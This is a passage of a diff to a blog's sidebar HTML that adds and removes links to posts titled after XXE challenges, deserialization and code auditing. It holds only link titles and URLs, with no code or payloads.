+            <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/">xxe解题三方面</a>
           </li>
         
           <li>
@@ -653,14 +779,6 @@
         
           <li>
             <a href="/2022/08/30/xxe%E4%B9%8Bxml%E5%AD%A6%E4%B9%A0/">xxe之xml学习</a>
-          </li>
-        
-          <li>
-            <a href="/2022/08/28/unserialize1/">unserialize1</a>
-          </li>
-        
-          <li>
-            <a href="/2022/08/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计1</a>
           </li>
         
       </ul>
